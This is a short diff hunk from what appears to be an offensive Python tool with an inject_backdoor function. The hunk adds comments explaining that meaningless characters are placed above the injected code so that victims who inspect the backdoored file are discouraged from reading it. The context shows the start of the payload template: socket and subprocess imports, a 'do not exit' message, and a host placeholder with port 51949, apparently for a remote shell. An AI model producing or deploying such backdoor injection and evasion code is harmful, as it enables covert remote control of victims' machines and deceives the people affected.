@@ -80,6 +80,8 @@ def inject_backdoor():
 ####################
 #@@@@@@@@@@@@@@@@@@#
 #@&$#|>#&\#&@#&>#&##
+#Random HEX and Characters above, were added in case the victim looks into the code of the backdoored file 
+#and they won't try to look into the source code as they see loads of weird meaningless code. SE Evasion
 import socket, subprocess
 print "Loading, DO NOT EXIT THIS APPLICATION!"
 host = "%s"\nport = 51949
